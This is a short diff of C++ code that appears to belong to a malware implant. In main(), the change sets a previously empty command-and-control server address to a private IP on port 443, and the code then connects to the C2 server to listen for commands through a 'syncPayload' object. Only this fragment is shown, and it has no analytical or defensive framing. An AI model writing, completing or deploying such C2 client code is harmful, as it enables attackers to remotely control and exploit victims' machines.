@@ -20,7 +20,7 @@ int main() {
 
     // Connect to the C2 server and listen for commands
     ABCsync syncPayload;
-    std::string c2Address = "";  // Example C2 address
+    std::string c2Address = "10.54.1.141";  // Example C2 address
     int c2Port = 443;  // Example C2 port
 
     std::cout << "[*] Connecting to C2 server at " << c2Address << ":" << c2Port << std::endl;
